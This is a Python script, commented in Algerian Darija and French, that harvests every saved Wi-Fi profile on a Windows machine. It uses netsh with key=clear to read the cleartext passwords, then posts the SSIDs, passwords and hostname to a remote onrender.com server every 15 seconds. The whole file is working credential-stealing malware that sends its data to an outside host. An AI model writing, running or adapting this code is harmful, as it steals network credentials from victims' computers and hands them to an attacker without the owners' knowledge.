#hdi bch n9dro n'executiw les commandes kichghol rana f cmd
import subprocess
#hadi bch ndo text li ykhrjlna f cmd w ndo meno ghir wch ns79o (nom et mot de passe) 
import re

#netsh wlan show profiles hadi bch n'affichiw ga3 les profils Wi-Fi enregistrés f el pc
#capture_output=True nricupiriw résultat dans une variable mchi f terminal
#.stdout.decode() → resultat ykhrj en byte hadi bch nrj3oh text
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
 
#doka lzm njbdo ga3 les wifi profils  
#n7wso 3la les lignes li fihom "All User Profile     : "
#w ndo ghir text li mor les :
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

#doka ncreyiw une liste li n7to fiha wifi names + passwords
wifi_list = []

# Si la liste des profils rahi vide, m3tha makyn 7ta Wi-Fi sauvegardé.
# Le bloc hada n9dro bih nparcuriw chaque profil trouvé pour checke ses informations détaillées et récupérer el password b la commande "key=clear".
if len(profile_names) != 0:
    for name in profile_names:
        #On crée un dictionnaire pour chaque réseau (n7to fih SSID + password).
        wifi_profile = {}
        #dpka n9dro nrunniw cpmmande li biha nchofo les information t3 wifi connection w ida security key is not absent tema n9dro njbdo password
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # ida kanet security key absent we ignore it
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            #n7tto ll ssid t3 wifi f dictionnaire
            wifi_profile["ssid"] = name

            #key=clear taffichi elpassword en clair (f admin mode)
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()

            #n7wso 3la la ligne li fiha el mot de passe
            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            #Check if we found a password wla n7to none ida m3ntdhomch password 
            if password == None:
                wifi_profile["password"] = None
            else:
                #n'ajoutiw el password dans le cas win kyn
                wifi_profile["password"] = password[1]
            #n'ajoutiw el wifi ll la liste t3 wifi-list
            wifi_list.append(wifi_profile) 


import requests
import threading
import datetime

ip_address    = "https://mini-server-90un.onrender.com/send"
time_interval = 15  # envoi chaque 15sec

def send_to_server():
    try:
        payload = {
            "type": "wifi_list",
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "computer": subprocess.getoutput("hostname"),
            "data": wifi_list
        }

        requests.post(
            ip_address,
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        threading.Timer(time_interval, send_to_server).start()

    except:
        threading.Timer(time_interval, send_to_server).start()

send_to_server()